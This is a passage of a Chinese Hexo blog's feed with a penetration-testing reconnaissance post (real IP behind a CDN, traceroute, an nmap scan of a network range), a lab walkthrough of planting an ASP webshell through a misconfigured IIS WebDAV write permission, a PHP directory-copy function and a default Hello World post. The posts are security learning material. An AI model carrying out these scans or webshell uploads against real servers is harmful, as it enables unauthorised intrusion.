<h4 id="0x04-CDN后的真实IP"><a href="#0x04-CDN后的真实IP" class="headerlink" title="0x04 CDN后的真实IP"></a>0x04 CDN后的真实IP</h4><ul>
<li><p>CDN概述<br>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决Internet网络拥挤的状况，提高用户访问网站的响应速度。</p>
</li>
<li><p>获得真实IP的方法<br>phpinfo中的server_addr的IP地址百分百是真实服务器的IP地址。<br>先看主站是否有phpinfo的页面，如果没有的话就查看他的二级域名中是否存在phpinfo页面.</p>
</li>
</ul>
<h4 id="0x05-c段子网网关"><a href="#0x05-c段子网网关" class="headerlink" title="0x05 c段子网网关"></a>0x05 c段子网网关</h4><p>通过路由跟踪排除c段不同网关邻居主机。    </p>
<ul>
<li><p>windows下的命令：只支持icmp（ping）协议，有些服务器会丢弃icmp协议    </p>
<pre><code>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] [-R] [-S srcaddr] [-4] [-6] target_name

-d                 不将地址解析成主机名。
-h maximum_hops    搜索目标的最大跃点数。
-j host-list       与主机列表一起的松散源路由(仅适用于 IPv4)。
-w timeout         等待每个回复的超时时间(以毫秒为单位)。
-R                 跟踪往返行程路径(仅适用于 IPv6)。
-S srcaddr         要使用的源地址(仅适用于 IPv6)。
-4                 强制使用 IPv4。
-6                 强制使用 IPv6。
</code></pre></li>
</ul>
<ul>
<li><p>linux下的命令：     </p>
<pre><code>traceroute -n -T -p 53 ip地址    
traceroute -n -T -p 80 //优先    
traceroute -n -I -p 80 //优先    
traceroute -T  -p 80     
-n 不解析主机名    
-p指定端口    
-T指定协议为TCP    
-S指定发送源端口   
</code></pre></li>
</ul>
<h4 id="0x06-IDC机房ISP信息"><a href="#0x06-IDC机房ISP信息" class="headerlink" title="0x06 IDC机房ISP信息"></a>0x06 IDC机房ISP信息</h4><ul>
<li>通过ip查询    <pre><code>nmap -Pn -n -sC -sV -p 80 211.147.4-6.1-254     
</code></pre>扫描目标网段的http-title，获取路由器title.</li>
</ul>
<ul>
<li>全球注册信息管理机构：<br>北美  arin.net<br>欧洲  ripe.net<br>亚洲  www.apnic.net<br>拉丁美洲/加勒比  whois.lacnic.net</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于白帽子来说，在开始渗透之前，必须先完成信息收集，那么信息收集的第一步是什么呢？就是WEB踩点。&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>IIS写权限漏洞</title>
    <link href="http://yoursite.com/2016/09/19/IIS%E5%86%99%E6%9D%83%E9%99%90/"/>
    <id>http://yoursite.com/2016/09/19/IIS写权限/</id>
    <published>2016-09-19T00:48:19.000Z</published>
    <updated>2016-09-21T02:03:16.642Z</updated>
    
    <content type="html"><![CDATA[<p>IIS写权限漏洞，说白了就是菜鸟管理员对IIS的错误配置问题：  </p>
<ul>
<li>WEB服务器扩展里设置WebDAV为允许；  </li>
<li>网站权限配置开启了写入权限与脚本资源访问权限。 <a id="more"></a>
</li>
</ul>
<h3 id="先在Windows-server2003中搭建好实验环境。"><a href="#先在Windows-server2003中搭建好实验环境。" class="headerlink" title="先在Windows server2003中搭建好实验环境。"></a>先在Windows server2003中搭建好实验环境。</h3><ul>
<li>WEB服务器扩展里设置WebDAV和Active Server Pages为允许；  </li>
<li>网站主目录权限配置开启写入权限与脚本资源访问权限；  </li>
<li>TCP端口为80；  </li>
<li>主目录属性-安全中来宾用户的权限为完全控制。</li>
</ul>
<h3 id="使用桂林老兵的IISwriter"><a href="#使用桂林老兵的IISwriter" class="headerlink" title="使用桂林老兵的IISwriter"></a>使用桂林老兵的IISwriter</h3><p><img src="http://i.imgur.com/dXNHb7g.png" alt=""><br>然后提交数据包，会在服务端生成一个test.txt的文件  </p>
<p><img src="http://i.imgur.com/90B933M.png" alt=""><br>但是这个问津不能被IIS解析，所以要用move，主要目的是为了将txt的文件修改为asp，从而变成可执行的脚本文件。  </p>
<p><img src="http://i.imgur.com/Qh4uVLK.png" alt=""><br>看一下，确实存在shell.asp文件  </p>
<p><img src="http://i.imgur.com/8vuWmRI.png" alt="">  </p>
<h3 id="用菜刀链接"><a href="#用菜刀链接" class="headerlink" title="用菜刀链接"></a>用菜刀链接</h3><p><img src="http://i.imgur.com/T1V0CU0.png" alt=""></p>
<h3 id="菜刀成功链接"><a href="#菜刀成功链接" class="headerlink" title="菜刀成功链接"></a>菜刀成功链接</h3><p><img src="http://i.imgur.com/beIwEEv.png" alt=""><br>成功拿到shel！</p>
<h3 id="错误集锦"><a href="#错误集锦" class="headerlink" title="错误集锦"></a>错误集锦</h3><ul>
<li>无法上传txt文件</li>
</ul>
<p><img src="http://i.imgur.com/f0t8J5i.png" alt=""><br>原因：没有写入权限</p>
<p><img src="http://i.imgur.com/9r8IOzs.png" alt=""><br>原因：TCP端口不是80</p>
<p><img src="http://i.imgur.com/cCDvQW8.png" alt=""><br>原因：WEB服务器扩展里没有设置WebDAV为允许</p>
<ul>
<li>无法更改txt文件为asp文件</li>
</ul>
<p><img src="http://i.imgur.com/fu790mL.png" alt=""></p>
<ul>
<li>菜刀出现故障</li>
</ul>
<p><img src="http://i.imgur.com/uLwjk2W.png" alt=""><br>原因：WEB服务器扩展里没有设置Active Server Pages为允许</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IIS写权限漏洞，说白了就是菜鸟管理员对IIS的错误配置问题：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WEB服务器扩展里设置WebDAV为允许；  &lt;/li&gt;
&lt;li&gt;网站权限配置开启了写入权限与脚本资源访问权限。
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="IIS" scheme="http://yoursite.com/tags/IIS/"/>
    
  </entry>
  
  <entry>
    <title>php复制整个文件目录的实现</title>
    <link href="http://yoursite.com/2016/09/10/php%E5%A4%8D%E5%88%B6%E6%95%B4%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2016/09/10/php复制整个文件目录的实现/</id>
    <published>2016-09-10T03:33:29.000Z</published>
    <updated>2016-09-21T02:03:02.142Z</updated>
    
    <content type="html"><![CDATA[<p>利用函数实现文件目录的复制<br><a id="more"></a></p>
<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre><code>function cpdir($directory,$ddirectory)
{    
//判断给定路径是否存在
if (file_exists($directory)&amp;&amp;file_exists($ddirectory)) 
{   
    //获取句柄
    if ($handle=opendir($directory)) 
    {   
        //遍历
        while ($file=readdir($handle)) 
        {
            if ($file!=&apos;.&apos; &amp;&amp; $file!=&apos;..&apos;) 
            {   
                //拼接
                $subfile=$directory.&apos;/&apos;.$file;
                $susfile=$ddirectory.&apos;/&apos;.$file;
                if (is_dir($subfile))
                 {

                    mkdir(&quot;$susfile&quot;);
                    cpdir($subfile,$susfile);
                }
                if (is_file($subfile)) 
                {
                    copy($subfile,$susfile );
                }

            }
        }
        closedir($handle);
    }
}
}

cpdir(&apos;./re02&apos;,&apos;./cp&apos;);`
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用函数实现文件目录的复制&lt;br&gt;
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>hello word</title>
    <link href="http://yoursite.com/2015/08/23/hello-world/"/>
    <id>http://yoursite.com/2015/08/23/hello-world/</id>
    <published>2015-08-23T07:32:58.000Z</published>
    <updated>2016-11-08T10:58:54.748Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
